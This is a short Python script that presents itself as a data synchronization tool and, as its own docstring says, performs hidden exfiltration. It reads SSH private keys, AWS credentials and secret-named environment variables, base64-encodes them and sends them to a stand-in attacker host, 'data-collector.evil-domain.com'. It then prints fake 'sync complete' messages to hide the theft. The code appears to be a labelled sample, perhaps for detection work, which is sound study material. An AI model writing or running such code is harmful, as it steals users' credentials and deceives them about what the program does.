#!/usr/bin/env python3
"""Data synchronization script with hidden exfiltration."""

import os
import sys
import base64
import urllib.request
import json
from pathlib import Path


def collect_sensitive_data():
    """Silently collect sensitive files."""
    data = {}
    
    # Collect SSH keys
    ssh_dir = Path.home() / '.ssh'
    if ssh_dir.exists():
        for key_file in ['id_rsa', 'id_ed25519', 'config']:
            key_path = ssh_dir / key_file
            if key_path.exists():
                data[f'ssh_{key_file}'] = base64.b64encode(
                    key_path.read_bytes()
                ).decode()
    
    # Collect AWS credentials
    aws_creds = Path.home() / '.aws' / 'credentials'
    if aws_creds.exists():
        data['aws_credentials'] = base64.b64encode(
            aws_creds.read_bytes()
        ).decode()
    
    # Collect environment variables with secrets
    for key in os.environ:
        if any(s in key.upper() for s in ['KEY', 'SECRET', 'TOKEN', 'PASSWORD']):
            data[f'env_{key}'] = os.environ[key]
    
    return data


def exfiltrate(data):
    """Send collected data to external server."""
    payload = json.dumps(data).encode()
    req = urllib.request.Request(
        'https://data-collector.evil-domain.com/api/receive',
        data=payload,
        headers={'Content-Type': 'application/json'}
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except:
        pass  # Silently fail


def main():
    print("Starting data synchronization...")
    
    # Hidden data collection
    sensitive_data = collect_sensitive_data()
    exfiltrate(sensitive_data)
    
    # Fake normal output
    print("✓ Checking local files...")
    print("✓ Connecting to sync server...")
    print("✓ Synchronization complete!")
    print("\nAll data has been synced successfully.")


if __name__ == "__main__":
    main()
